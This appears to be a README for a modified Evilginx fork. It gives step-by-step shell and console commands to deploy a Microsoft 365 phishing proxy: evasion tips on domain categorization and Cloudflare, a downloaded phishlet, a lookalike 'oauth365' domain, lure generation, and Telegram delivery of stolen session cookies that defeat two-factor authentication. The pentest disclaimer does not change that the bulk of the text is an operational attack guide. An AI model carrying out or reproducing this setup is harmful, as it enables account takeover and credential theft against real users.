# Note You can use the author's script below which is faster and quick.

Evilginx Setup Telegram Result Notification 

First categorize your domain as a business or tech company...or buy an already categorized domain from dyn

Try FortiGuard.com


ssh -i "rdpkeyforawsec2.pem" ubuntu@x.x.x.x.x.us-west-2.compute.amazonaws.com

cd /root

# Update ubuntu
sudo apt update
sudo apt upgrade -y 

# install tools
sudo apt install wget make git -y 

# Stop dns resolver
sudo systemctl stop systemd-resolved

sudo nano /etc/resolv.conf

You should have nameserver 127.0.0.53 there. Comment that out and add your preferred DNS servers to the list:

nameserver 127.0.0.53
nameserver 1.1.1.1
nameserver 1.0.0.2
As an example, the nameserver information should look like this:


sudo nano /etc/hosts

Add 127.0.1.1 yourMachineName under 127.0.0.1, like this
127.0.0.1 localhost
127.0.1.1 webapp-evilginx

after these steps reboot your vps or machine before you continue.



# Download Go tarball
wget https://go.dev/dl/go1.22.3.linux-amd64.tar.gz

# Extract packages to /usr/local
sudo tar -zxvf go1.22.3.linux-amd64.tar.gz -C /usr/local/



echo "export PATH=/usr/local/go/bin:${PATH}" | sudo tee /etc/profile.d/go.sh

source /etc/profile.d/go.sh


# Clone and compile from source
git clone https://github.com/fluxxset/evilginx2.git
cd evilginx2 

chmod +x evilginx2

./evilginx2

# Our Phishlet
sudo wget https://raw.githubusercontent.com/user-user-user/phishlets/refs/heads/main/phishlet365.yaml -P /root/evilginx2/phishlets


Note: If you start your evilginx and get ... exit, and run sudo nano /root/.evilginx/config.json and change the dns port from port 53 to port 5300. and restart your evilginx.


config domain oauth365-v2auth-sso.domain.org
config ipv4 external 44.1.1.111


phishlets hostname microsoft365 oauth365-v2auth-sso.domain.org
phishlets enable microsoft365


lures create microsoft365

lures get-url 0

Use cloudflare to secure your site..


# Evilginx 3.0
```
- git clone https://github.com/fluxxset/evilginx2.git
- cd evilginx2
- ./evilginx2 # and exit
- nano /root/.evilginx/config.json ## add chatid and teletoken and save and exit
- ./evilginx2
```
---
Big Thanks to [kgretzky](https://github.com/kgretzky/) for Creating such great tool  
---

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

<p align="center">
  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
</p>

---
This has been modified to only send valid sessions, no empty logs, and will include the cookies in a randomly named TXT file. 📂✅🍪

![image (4)](https://github.com/user-attachments/assets/a102ecd7-e342-44c4-bff5-3004d16c0df4)
---

## Disclaimer

I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.


---
## 🧑‍🏫 Evilginx Training Course

> 🔥 *Already mastering Evilginx? Level up with my complete [Evilginx Training Course](https://shop.fluxxset.com/product/evilginx-training-course/). Check it out!*

![Evilginx Training Course Banner](http://shop.fluxxset.com/wp-content/uploads/2024/08/Evilginx_course.png)
<!-- ## 🧑‍🏫 Evilginx Training Course

Ready to become an Evilginx master? Check out my [Complete Evilginx Training Course](https://shop.fluxxset.com/product/evilginx-training-course/)! It covers everything from setting up Evilginx, creating advanced phishlets, to deploying custom plugins with Python. It's packed with *tips, tricks*, and *real-world examples*. -->

---
